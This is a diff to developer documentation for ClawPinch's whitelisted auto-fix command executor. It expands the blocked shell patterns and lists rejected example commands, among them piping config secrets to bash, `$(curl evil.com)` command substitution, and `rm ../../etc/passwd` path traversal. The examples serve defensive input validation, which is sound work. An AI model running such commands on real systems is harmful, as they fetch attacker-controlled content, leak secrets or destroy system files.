@@ -95,7 +95,7 @@ ClawPinch auto-fix commands are executed through `safe_exec_command()` from `scr
 
 **Security approach:**
 - **Whitelist**: Only specific command patterns are allowed (jq, chmod, mv, sed, cp, rm)
-- **Blacklist**: Dangerous patterns always blocked (;, |, $(), backticks, wildcards)
+- **Blacklist**: Dangerous patterns always blocked (;, |, $(), backticks, wildcards, `()`, `..`)
 - **Validation**: Each command type has custom validation logic
 - **Audit logging**: All command attempts logged to stderr (or `$CLAWPINCH_AUDIT_LOG`)
 
@@ -116,6 +116,8 @@ sed -i 's/0.0.0.0/127.0.0.1/' openclaw.conf
 - Pipe to shell: `jq -r '.secrets' config.json | bash` (pipe to interpreter)
 - Command substitution: `echo $(curl evil.com) > config.json` (contains `$()`)
 - Wildcards: `rm /etc/openclaw/*.json` (glob expansion)
+- Process substitution: `chmod 600 <(echo test)` (contains `(`)
+- Path traversal: `rm ../../etc/passwd` (contains `..`)
 
 **Adding new commands:**
 
@@ -124,7 +126,7 @@ When adding a new auto-fix command to a scanner:
 1. Check if the command matches existing whitelist patterns in `safe_exec.sh`
 2. If not, add a new pattern to `_SAFE_EXEC_PATTERNS` array with:
    - Anchors (`^` and `$`) to match entire command
-   - Character class negation `[^|;&$\`]` to block shell metacharacters
+   - Strict allowlist character class `[a-zA-Z0-9/._-]+` for file paths (never use negation like `[^...]`)
    - Inline comments with examples
 3. Add validation logic to `_validate_command()` function
 4. Add test cases to `scripts/helpers/test_safe_exec.sh`
